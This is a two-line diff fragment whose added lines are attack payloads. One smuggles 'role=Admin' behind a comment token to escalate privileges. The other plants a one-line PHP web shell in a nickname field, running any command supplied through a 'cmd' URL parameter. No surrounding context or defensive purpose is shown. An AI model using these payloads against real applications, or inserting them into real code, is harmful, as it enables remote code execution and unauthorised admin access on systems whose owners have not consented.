@@ -1,0 +1,2 @@
+/**/role=Admin
+nickname=<?php+system($_GET['cmd']);?>
